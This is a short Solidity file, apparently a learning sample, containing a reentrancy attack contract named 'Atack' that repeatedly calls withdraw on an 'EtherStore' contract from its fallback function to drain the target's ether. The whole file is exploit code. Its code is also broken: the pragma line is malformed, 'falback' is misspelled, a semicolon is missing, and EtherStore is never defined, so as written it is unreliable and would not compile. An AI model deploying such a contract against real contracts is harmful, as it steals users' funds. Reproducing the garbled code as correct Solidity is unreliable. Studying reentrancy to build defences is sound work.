pragma 0.8.13;


contract Atack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
       etherStore = EtherStore(_etherStoreAddress); 
    }

    falback() external payable {
       if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }  
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        //0.5 solc ->   etherStore.deposit.value(1 ether)();
        //>0.6 ->
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether)
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}  
